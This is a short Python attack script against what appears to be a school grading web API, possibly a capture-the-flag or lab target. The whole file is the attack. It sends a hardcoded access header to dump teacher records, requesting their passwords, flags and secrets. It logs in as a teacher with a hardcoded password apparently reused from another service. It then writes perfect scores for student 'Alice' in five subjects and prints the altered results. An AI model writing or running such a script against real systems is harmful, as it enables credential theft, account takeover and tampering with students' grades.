#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://192.168.100.110:54088"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def dump_teachers():
    print("\n=== Dumping Teachers (54088) ===")
    try:
        resp = requests.get(
            f"{BASE_URL}/api/v1/users",
            params={
                "user_type": "teachers",
                "fields": "user_id,name,password,user_type,flag,secret",
            },
            headers=HEADERS,
        )
        if resp.status_code == 200:
            print(json.dumps(resp.json(), indent=2))
        else:
            print(f"Error: {resp.status_code} - {resp.text}")
    except Exception as e:
        print(e)


def set_perfect_scores():
    print("\n=== Setting Perfect Scores for Alice (54088) ===")
    # Need to login first?
    # Let's try T001 with the password from 3333 first.
    session = requests.Session()
    session.headers.update(HEADERS)

    # Try Login
    try:
        login_data = {
            "user_id": "T001",
            "password": "QRSwojjqYV3r3FWvrQ_V3eminq-zZYc5BCZAu_6ptBM",
            "user_type": "teacher",
        }
        resp = session.post(f"{BASE_URL}/api/v1/login", json=login_data)
        print(f"Login T001: {resp.status_code}")

        if resp.status_code != 200:
            print("[-] Login failed. Admin password might be different on 54088.")
            return

        subjects = ["Math", "English", "Science", "History", "Art"]
        for sub in subjects:
            resp = session.post(
                f"{BASE_URL}/api/v1/score",
                json={"student_id": "S001", "subject": sub, "score": 100},
            )
            print(f"  {sub}: {resp.status_code}")

        # Check Stats
        resp = session.get(f"{BASE_URL}/api/v1/statistics")
        print("\n=== Statistics (After Update) ===")
        print(json.dumps(resp.json(), indent=2))

        # Check Alice's Grade
        resp = session.get(f"{BASE_URL}/api/v1/student/S001/scores")
        print("\n=== Alice's Scores (After Update) ===")
        print(json.dumps(resp.json(), indent=2))

    except Exception as e:
        print(f"Error: {e}")


dump_teachers()
set_perfect_scores()
